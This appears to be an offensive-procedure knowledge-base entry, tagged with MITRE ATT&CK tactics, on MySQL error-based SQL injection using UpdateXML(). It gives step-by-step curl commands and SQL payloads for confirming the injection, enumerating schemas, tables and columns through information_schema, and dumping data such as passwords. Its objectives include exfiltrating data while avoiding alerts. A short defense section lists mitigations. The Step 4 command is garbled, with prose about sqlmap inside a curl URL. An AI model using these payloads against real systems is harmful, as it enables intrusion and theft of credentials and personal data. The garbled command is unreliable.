---
id: dd513035-5bbf-46dc-a024-f9146aa45c89
name: MySQL-Error-Based-Data-Extraction-Using-UpdateXML
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:34.474474+00:00'
updated_at: '2023-04-10T20:22:54.882488+00:00'
tactics:
  - '[[tactics/Initial Access|TA0001 - Initial Access]]'
  - '[[tactics/Discovery|TA0007 - Discovery]]'
  - '[[tactics/Collection|TA0009 - Collection]]'
techniques:
  - >-
    [[techniques/Exploit Public-Facing Application|T1190 - Exploit Public-Facing
    Application]]
  - >-
    [[techniques/Unprotected Storage of Credentials|T1552 - Unprotected Storage
    of Credentials]]
sub_techniques: []
tags:
  - mysql
  - sql-injection
  - error-based
  - updatexml
  - data-exfiltration
commands:
  - '[[commands/curl-inject-mysql-updatexml]]'
platforms:
  - Web
  - MySQL
tools:
  - '[[tools/sqlmap]]'
  - '[[tools/Burp-Suite]]'
validated: true
---

# MySQL-Error-Based-Data-Extraction-Using-UpdateXML

## Summary

This procedure demonstrates how to perform error-based SQL injection in MySQL databases using the UpdateXML() function to extract sensitive data such as database versions, schema names, table names, column names, and actual data records. By triggering XML parsing errors, attackers can force the database to reveal information through error messages, enabling reconnaissance and data exfiltration without direct query execution.

## Description

Error-based SQL injection exploits vulnerabilities in web applications that fail to sanitize user inputs, allowing attackers to inject malicious SQL payloads. The UpdateXML() function in MySQL is particularly useful for this because it attempts to update an XML document and throws a detailed error if the XPath expression is invalid, embedding the attacker's concatenated data in the error output. This technique is effective against MySQL versions 5.1 and later, where error messages are verbose by default. It is commonly used in scenarios where the application interacts with a MySQL backend, such as login forms, search fields, or parameter-driven queries. The attack starts with blind extraction of metadata (e.g., version and schemas) and progresses to dumping specific data, all without requiring knowledge of the full database structure upfront. Success relies on the application displaying or logging error messages that include the injected content.

## Requirements

1. A vulnerable web application endpoint that accepts user input and passes it unsanitized to a MySQL backend (e.g., a search or login form).
2. Network access to the target application, typically over HTTP/HTTPS.
3. Tools for crafting and sending HTTP requests, such as curl or a proxy like Burp Suite.
4. Basic knowledge of the injection point (e.g., a string parameter like 'username' or 'id').
5. MySQL error reporting enabled on the server (default in many configurations).

## Defense

- Use prepared statements or parameterized queries in application code to separate SQL logic from user input.
- Implement strict input validation and sanitization, rejecting or escaping special characters like quotes and XML tags.
- Configure MySQL to suppress detailed error messages (e.g., set log_error_verbosity to a lower level or use custom error handlers).
- Employ web application firewalls (WAFs) to detect and block common SQL injection patterns, including UpdateXML payloads.
- Limit database user privileges to the minimum necessary, preventing access to information_schema or sensitive tables.

## Objectives

1. Identify and confirm a SQL injection vulnerability in a MySQL-backed application.
2. Extract database metadata, including version, schemas, tables, and columns.
3. Retrieve sensitive data from target tables for further exploitation or analysis.
4. Achieve data exfiltration without triggering obvious alerts in sanitized environments.

## Instructions

### Step 1: Confirm Vulnerability and Extract Database Version

**Context**: Begin by injecting a basic UpdateXML payload to verify the injection point and extract the MySQL version. This step confirms the error-based technique works by observing the version embedded in the XML error message.

**Command** ([[commands/curl-inject-mysql-updatexml]]):
```bash
curl -X POST http://target.com/login.php -d "username=' and updatexml(null,concat(0x0a,version()),null)-- - &password=test"
```

> This command sends a POST request to a vulnerable login endpoint, injecting the payload into the 'username' parameter. The concat() function wraps the version() output with a newline (0x0a) for readability, and '-- -' comments out the rest of the query. If successful, the response will include an error like "XPATH syntax error: '~5.7.44~'" where '~5.7.44~' reveals the version. Adjust the endpoint, method, and parameter as needed for the target.

**Expected Output**: HTTP response containing an XML-related error message with the database version embedded, e.g., "Error: XPATH syntax error: '\n5.7.44\n'".

### Step 2: Enumerate Schemas and Tables

**Context**: Once the version is confirmed, use the injection to query information_schema for schema names and table names. This builds a map of the database structure for targeted data extraction.

**Code** ([[codes/MySQL-UpdateXML-Schema-and-Table-Extraction-Payload]]):
```sql
AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),schema_name,CHAR(126)) FROM information_schema.schemata LIMIT data_offset,1)),null)--
AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),TABLE_NAME,CHAR(126)) FROM information_schema.TABLES WHERE table_schema=data_column LIMIT data_offset,1)),null)--
```

> Inject these payloads sequentially via the command from Step 1, replacing 'data_offset' with 0,1,2,... to iterate results, and 'data_column' with the schema name (e.g., 'database()'). The colon (0x3a) and tilde (CHAR(126)) delimiters make parsing easy. Expected errors will show schema/table names like "~users~" in the message.

**Expected Output**: Error messages revealing schema names (e.g., "~information_schema~", "~app_db~") and table names (e.g., "~users~", "~orders~").

### Step 3: Extract Column Names and Data

**Context**: With tables identified, query for column names and then dump data from specific columns. This step focuses on sensitive data like passwords or personal info.

**Code** ([[codes/MySQL-UpdateXML-Column-and-Data-Extraction-Payload]]):
```sql
AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),column_name,CHAR(126)) FROM information_schema.columns WHERE TABLE_NAME=data_table LIMIT data_offset,1)),null)--
AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),data_info,CHAR(126)) FROM data_table.data_column LIMIT data_offset,1)),null)--
```

> Build on previous steps: Replace 'data_table' with a discovered table (e.g., 'users'), 'data_column' with a column (e.g., 'password'), and iterate 'data_offset'. Inject via the same curl command, observing errors for column lists (e.g., "~id~") and data rows (e.g., "~hashed_pass123~").

**Expected Output**: Error messages with column names and row data delimited by '~', allowing reconstruction of the database contents.

### Step 4: Iterate and Automate if Needed

**Context**: Manually iterating offsets can be tedious; use tools like sqlmap for automation while incorporating UpdateXML for error-based extraction in noisy environments.

**Command** ([[commands/curl-inject-mysql-updatexml]]):
```bash
curl -X GET "http://target.com/search.php?q='; use [[tools/sqlmap]] for batch extraction with --technique=E --dbms=mysql --dump"
```

> If manual injection is slow, proxy through Burp Suite or switch to sqlmap with the --tamper option to encode UpdateXML payloads. Verify each extraction by parsing error responses.

**Expected Output**: Full database dump or partial data confirming successful exfiltration.
